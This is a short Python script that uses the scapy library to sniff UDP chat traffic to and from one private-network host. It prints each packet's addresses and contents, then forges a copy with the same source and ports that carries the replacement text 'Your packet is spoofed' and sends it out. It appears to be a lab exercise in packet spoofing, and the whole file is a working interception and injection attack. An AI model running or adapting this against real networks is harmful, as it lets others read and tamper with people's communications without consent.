from scapy.all import *

def spoof_chat(packet):

	if UDP in packet:
		if packet.haslayer(Raw):
			data = packet[Raw].load
		else:
			data = None

		print("Original packet")
		print("Packet Source: {}".format(packet[IP].src))
		print("Packet Destination: {}".format(packet[IP].dst))
		print("Packet Data: {}".format(data))
		print("-------------------------------------------------------")

		ip = IP(src=packet[IP].src, dst=packet[IP].dst, ihl=packet[IP].ihl)
		udp = UDP(sport=packet[UDP].sport, dport=packet[UDP].dport)

		if packet.haslayer(Raw):
			data="Your packet is spoofed"
			new_packet = ip/udp/data
		else:
			new_packet = ip/udp

		print("Spoofed packet")
		print("Packet Source: {}".format(new_packet[IP].src))
		print("Packet Destination: {}".format(new_packet[IP].dst))
		print("****************************************************************************")

		send(new_packet, verbose=0)



sniff(filter="udp and src host 192.168.147.150 or dst host 192.168.147.150", prn=spoof_chat)